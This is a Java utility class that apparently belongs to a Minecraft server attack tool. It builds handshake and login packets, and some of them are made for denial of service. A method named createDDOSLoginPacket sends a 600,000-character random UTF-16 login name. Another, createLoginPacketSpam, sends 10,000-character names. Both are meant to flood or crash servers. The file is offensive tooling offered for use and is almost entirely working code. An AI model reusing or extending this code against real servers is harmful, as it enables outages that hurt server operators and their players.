package asmr.dev_.dbv2.options;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public final class PacketUtils {
    public static int nextInt(int startInclusive, int endExclusive) {
        return (endExclusive - startInclusive <= 0) ? startInclusive : (startInclusive + (new Random()).nextInt(endExclusive - startInclusive));
    }

    public static double nextDouble(double startInclusive, double endInclusive) {
        return (startInclusive != endInclusive && endInclusive - startInclusive > 0.0D) ? (startInclusive + (endInclusive - startInclusive) * Math.random()) : startInclusive;
    }

    public static float nextFloat(float startInclusive, float endInclusive) {
        return (startInclusive != endInclusive && endInclusive - startInclusive > 0.0F) ? (float)(startInclusive + (endInclusive - startInclusive) * Math.random()) : startInclusive;
    }

    public static String randomNumber(int length) {
        return random(length, "123456789");
    }

    public static String randomString(int length) {
        return random(length, "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
    }

    public static String random(int length, String chars) {
        return random(length, chars.toCharArray());
    }
    public static void writePacket(byte[] packetData, DataOutputStream out) throws IOException {
        writeVarInt(out, packetData.length);
        out.write(packetData);
    }
    public static byte[] createHandshakePacket(String ip, int port, int protocol) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeHandshakePacket(out, ip, port, protocol, 2);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }
    public static String randomUTF16String1(int length) {
        Random rnd = new Random();
        StringBuilder s = new StringBuilder();
        for (int i = 0; i < length; i++)
            s.append((char)(-128 + rnd.nextInt(255)));
        return new String(s.toString().getBytes(StandardCharsets.UTF_8), StandardCharsets.UTF_16);
    }
    public static byte[] createLoginPacket() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, PacketUtils.randomString(6));
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }

    public static String ImSureLeaked = randomUTF16String1(600000);

    public static byte[] createDDOSLoginPacket() throws IOException {
        return getBytes(ImSureLeaked);
    }
    private static byte[] getBytes(String bert) throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, bert);
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }
    public static void writeHandshakePacket(DataOutputStream out, String ip, int port, int protocol, int state) throws IOException {
        writeVarInt(out, 0);
        writeVarInt(out, protocol);
        writeString(out, ip);
        out.writeShort(port);
        writeVarInt(out, state);
    }
    public static void writeString(DataOutputStream out, String value) throws IOException {
        byte[] data = value.getBytes(StandardCharsets.UTF_8);
        writeVarInt(out, data.length);
        out.write(data, 0, data.length);
    }
    public static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte(value & 0x7F | 0x80);
            value >>>= 7;
        }
        out.writeByte(value);
    }
    public static byte[] createLoginPacketSpam() throws IOException {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(bytes);
        writeVarInt(out, 0);
        writeString(out, PacketUtils.randomString(10000));
        byte[] data = bytes.toByteArray();
        bytes.close();
        return data;
    }
    public static String random(int length, char[] chars) {
        StringBuilder stringBuilder = new StringBuilder();
        for (int i = 0; i < length; i++)
            stringBuilder.append(chars[(new Random()).nextInt(chars.length)]);
        return stringBuilder.toString();
    }
}
